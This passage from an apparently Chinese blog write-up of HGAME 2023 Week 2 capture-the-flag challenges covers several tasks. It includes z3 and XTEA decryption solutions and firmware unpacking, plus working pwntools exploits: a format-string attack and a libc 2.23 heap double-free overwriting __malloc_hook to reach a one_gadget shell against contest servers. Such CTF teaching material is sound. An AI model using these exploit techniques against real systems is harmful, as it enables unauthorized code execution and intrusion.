class="number">44270</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">f = [Int(<span class="string">f&#x27;f<span class="subst">&#123;i&#125;</span>&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line">ff = f[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            out[<span class="number">5</span>*i+j] += ff[<span class="number">5</span>*i+k] * x[<span class="number">5</span>*k+j]</span><br><span class="line">        s.add(out[<span class="number">5</span>*i+j] == c[<span class="number">5</span>*i+j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(m[f[i]].as_long())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;y0ur_m@th_1s_gO0d&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="VidarCamera"><a href="#VidarCamera" class="headerlink" title="VidarCamera"></a>VidarCamera</h3><blockquote><p>兔兔最近在学习Android开发，这是他抄的相机程序</p></blockquote><p>apk内关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span>[] m229encrypthkIa6DI(<span class="type">int</span>[] iArr) &#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">4</span>);</span><br><span class="line">	UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">0</span>, <span class="number">2233</span>);</span><br><span class="line">	UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">1</span>, <span class="number">4455</span>);</span><br><span class="line">	UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">2</span>, <span class="number">6677</span>);</span><br><span class="line">	UIntArray.m457setVXSXFK8(m446constructorimpl, <span class="number">3</span>, <span class="number">8899</span>);</span><br><span class="line">	<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (i2 &lt; <span class="number">9</span>) &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		<span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			i3++;</span><br><span class="line">			i = i2 + <span class="number">1</span>;</span><br><span class="line">			UIntArray.m457setVXSXFK8(iArr, i2, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(i4 &amp; <span class="number">3</span>)) + i4) ^ UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i))) ^ i4)));</span><br><span class="line">			UIntArray.m457setVXSXFK8(iArr, i, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i2)) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(UInt.m393constructorimpl(i4 &gt;&gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + i4))));</span><br><span class="line">			i4 = UInt.m393constructorimpl(i4 + <span class="number">878077251</span>);</span><br><span class="line">		&#125; <span class="keyword">while</span> (i3 &lt;= <span class="number">32</span>);</span><br><span class="line">		i2 = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> iArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m230onCreate$lambda0(EditText inputsomething, CameraActivity <span class="built_in">this</span>$<span class="number">0</span>, AlertDialog alertDialog, View view) &#123;</span><br><span class="line">	Intrinsics.checkNotNullParameter(inputsomething, <span class="string">&quot;$inputsomething&quot;</span>);</span><br><span class="line">	Intrinsics.checkNotNullParameter(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">	<span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> inputsomething.getText().toString();</span><br><span class="line">	<span class="keyword">if</span> (obj.length() != <span class="number">40</span>) &#123;</span><br><span class="line">		Toast.makeText(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;序列号不正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">40</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">		UIntArray.m457setVXSXFK8(m446constructorimpl, i / <span class="number">4</span>, UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(obj.charAt(i)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">1</span>) &lt;&lt; <span class="string">&#x27;\b&#x27;</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span>[] m229encrypthkIa6DI = <span class="built_in">this</span>$<span class="number">0.</span>m229encrypthkIa6DI(m446constructorimpl);</span><br><span class="line">	UInt[] uIntArr = &#123;UInt.m387boximpl(<span class="number">637666042</span>), UInt.m387boximpl(<span class="number">457511012</span>), UInt.m387boximpl(-<span class="number">2038734351</span>), UInt.m387boximpl(<span class="number">578827205</span>), UInt.m387boximpl(-<span class="number">245529892</span>), UInt.m387boximpl(-<span class="number">1652281167</span>), UInt.m387boximpl(<span class="number">435335655</span>), UInt.m387boximpl(<span class="number">733644188</span>), UInt.m387boximpl(<span class="number">705177885</span>), UInt.m387boximpl(-<span class="number">596608744</span>)&#125;;</span><br><span class="line">	<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i2 + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (uIntArr[i2].m444unboximpl() != UIntArray.m452getpVg5ArA(m229encrypthkIa6DI, i2)) &#123;</span><br><span class="line">			Toast.makeText(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;序列号不正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt; <span class="number">9</span>) &#123;</span><br><span class="line">			alertDialog.dismiss();</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			i2 = i3;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>魔改XTEA加密，修改了delta、异或操作和加密顺次，解密脚本在相应地方修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x34566543</span></span><br><span class="line">    x = delta * <span class="number">33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line">    </span><br><span class="line">c = [<span class="number">0x260202FA</span>, <span class="number">0x1B451064</span>, <span class="number">0x867B61F1</span>, <span class="number">0x228033C5</span>, <span class="number">0xF15D82DC</span>, <span class="number">0x9D8430B1</span>, <span class="number">0x19F2B1E7</span>, <span class="number">0x2BBA859C</span>, <span class="number">0x2A08291D</span>, <span class="number">0xDC707918</span>]</span><br><span class="line">key = [<span class="number">2233</span>, <span class="number">4455</span>, <span class="number">6677</span>, <span class="number">8899</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    d = decrypt(c[-<span class="number">2</span>:], key)</span><br><span class="line">    flag = long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>] + flag</span><br><span class="line">    c = c[:-<span class="number">2</span>] + [d[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;e&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>补全flag头，flag：<code>hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;</code>。</p><p>​</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><blockquote><p>HINTS:</p><p>格式化占位符的值来自于函数的参数，同时64位程序传参不是只用寄存器的哦</p><p>%n占位符是存在溢出的</p></blockquote><p>打格式化字符串，分别泄露栈地址和 <code>__libc_start_main()</code> 地址求得libc基地址，再用one_gadget打即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">30687</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.send(p64(stack_addr)*<span class="number">0x20</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%45$p%4418c%8$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+r.recv(<span class="number">12</span>))-<span class="number">243</span></span><br><span class="line">libc_base = libc_start_main - libc.sym.__libc_start_main</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#r.recvline()</span></span><br><span class="line"></span><br><span class="line">ogg = libc_base+<span class="number">0xe3b01</span></span><br><span class="line">r.recvline()</span><br><span class="line">pl = p64(stack_addr-<span class="number">224</span>+<span class="number">2</span>)+p64(stack_addr-<span class="number">224</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%8$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&amp;<span class="number">0xffff</span>)-((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p>libc 2.23 UAF，泄露 <code>__malloc_hook()</code> 地址求得libc基地址，double free后使用 <code>realloc()</code> 调试，使得满足one_gadget条件即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">31341</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ind,size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">ind</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">ind</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">104</span></span><br><span class="line">libc_base = malloc_hook - libc.sym.__malloc_hook</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">ogg = libc_base + <span class="number">0xf1247</span></span><br><span class="line">realloc = libc_base + libc.sym.realloc</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(ogg)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Pirated-router"><a href="#Pirated-router" class="headerlink" title="Pirated router"></a>Pirated router</h3><blockquote><p>兔兔在回家的火车上,看到一个神秘的0tatoP在卖路由器,于是兔兔买了一个回家过年,但是这个路由器咋总感觉怪怪的</p></blockquote><p>路由器bin固件文件，参考<a target="_blank" rel="noopener" href="https://iqqoz.com/post-3231.html#gsc.tab=0">提取路由器固件中的squashfs文件系统unsquashfs提取方法</a>，提取路由器固件中的squashfs。</p><p>安装squashfs后，使用binwalk分离bin文件：<code>binwalk -e AC10086W_FW_1.1.4.5.bin</code>，生成文件夹 <code>squashfs-root</code>，其中的squashfs文件，修改文件头为 <code>hsqs</code>。</p><p>利用 <a target="_blank" rel="noopener" href="https://github.com/rampageX/firmware-mod-kit.git">firmware-mod-kit</a> 解包squashfs文件：<code>unsquashfs 1.squashfs</code>，在 <code>/bin</code> 目录中发现一个文件名比较特别的程序 <code>secret_program</code>，使用IDA查看逻辑，<code>main()</code> 函数中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _OWORD v4[<span class="number">8</span>]; <span class="comment">// [xsp+10h] [xbp+10h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [xsp+90h] [xbp+90h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [xsp+98h] [xbp+98h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+9Ch] [xbp+9Ch]</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">0</span>] = unk_4543B0;</span><br><span class="line">  v4[<span class="number">1</span>] = unk_4543C0;</span><br><span class="line">  v4[<span class="number">2</span>] = unk_4543D0;</span><br><span class="line">  v4[<span class="number">3</span>] = unk_4543E0;</span><br><span class="line">  v4[<span class="number">4</span>] = unk_4543F0;</span><br><span class="line">  v4[<span class="number">5</span>] = unk_454400;</span><br><span class="line">  v4[<span class="number">6</span>] = unk_454410;</span><br><span class="line">  v4[<span class="number">7</span>] = unk_454420;</span><br><span class="line">  v5 = <span class="number">94</span>;</span><br><span class="line">  v6 = <span class="number">35</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(&amp;unk_4543A8, *((_DWORD *)v4 + i) ^ v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取数据，简单异或操作还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">75</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">86</span>, <span class="number">77</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">64</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">124</span>, <span class="number">69</span>, <span class="number">74</span>, <span class="number">81</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">66</span>, <span class="number">81</span>, <span class="number">70</span>, <span class="number">124</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">124</span>, <span class="number">16</span>, <span class="number">98</span>, <span class="number">80</span>, <span class="number">90</span>, <span class="number">94</span>]</span><br><span class="line">ss = [k^<span class="number">35</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;unp4ck1ng_firmware_1s_3Asy&#125;&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2023/01/30/match-HGAME-2023-Week-3/" title="HGAME 2023 Week 3"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2023/01/11/match-HGAME-2023-Week-1/" title="HGAME 2023 Week 1"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一杯咖啡☕~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏他一波哦~</p></div><div 